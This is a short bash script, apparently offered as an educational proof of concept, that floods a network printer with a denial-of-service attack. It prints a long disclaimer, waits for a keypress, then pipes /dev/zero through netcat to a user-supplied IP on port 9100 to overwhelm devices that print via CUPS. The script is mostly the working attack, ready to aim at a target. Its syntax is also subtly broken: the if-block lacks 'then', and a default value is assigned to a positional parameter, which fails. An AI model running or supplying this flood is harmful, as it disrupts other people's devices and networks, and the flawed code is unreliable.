#!/bin/bash

#TODO: Add validations.

echo "You are about to run a script that can cause significant inconvenience and losses to you and other users on your network devices, for which only you will can held responsible! The script is an educational exercise and is not meant for actual DOS attacks. The author of this script is not responsible for any losses you or others incur due to the fact that you ran this script. The tool is to fire a Denial of Service attack against network devices that print via CUPS. If you don't intend to run this, please exit the script by closing the terminal window or by pressing ^C (i.e. control and C). Thank you."
echo

echo "This script is a proof of concept and has many improvements planned."
echo

read -p "Press any key to continue (or ^C to exit - this is your last chance)."

ip=${1}

if [[ -z ${ip} ]]
	echo "usage ${0} <<IP Address>> <<PORT (optional defaults to 9100>>"
	exit 1;
fi;

port=${2:=9100}

cat -v /dev/zero | netcat ${ip} ${port}
